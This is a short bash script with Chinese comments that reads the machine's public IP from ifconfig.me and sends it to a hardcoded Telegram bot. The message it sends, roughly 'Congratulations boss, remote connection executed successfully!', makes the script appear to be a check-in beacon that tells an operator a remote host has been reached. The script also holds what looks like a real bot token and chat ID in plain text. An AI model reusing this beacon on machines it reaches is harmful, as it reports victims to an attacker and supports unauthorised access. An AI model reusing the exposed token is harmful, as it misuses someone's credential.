#!/bin/bash
# Telegram Bot Token 和 Chat ID
TG_BOT_TOKEN="7566682737:AAEaQbNrxNFcqgdgcv2ckgjyOAYeZtfJQf0"
TG_CHAT_ID="5553145286"

# 获取公网 IP 地址
PUBLIC_IP=$(curl -s http://ifconfig.me)

# 发送消息到 Telegram 的函数
send_tg_message() {
  local MESSAGE=$1
  curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" \
    -d chat_id="$TG_CHAT_ID" \
    -d text="$MESSAGE" > /dev/null
}

# 执行远程命令并发送结果到 Telegram
execute_remote_command() {
  # 这里假设远程命令已经通过脚本传入，直接执行
  echo "远程命令执行成功"

  # 构造消息，包含公网 IP
  MESSAGE="恭喜老板，远程连接执行成功！本机公网IP为：$PUBLIC_IP"
  
  # 发送消息到 Telegram
  send_tg_message "$MESSAGE"
}

# 调用远程命令执行函数
execute_remote_command
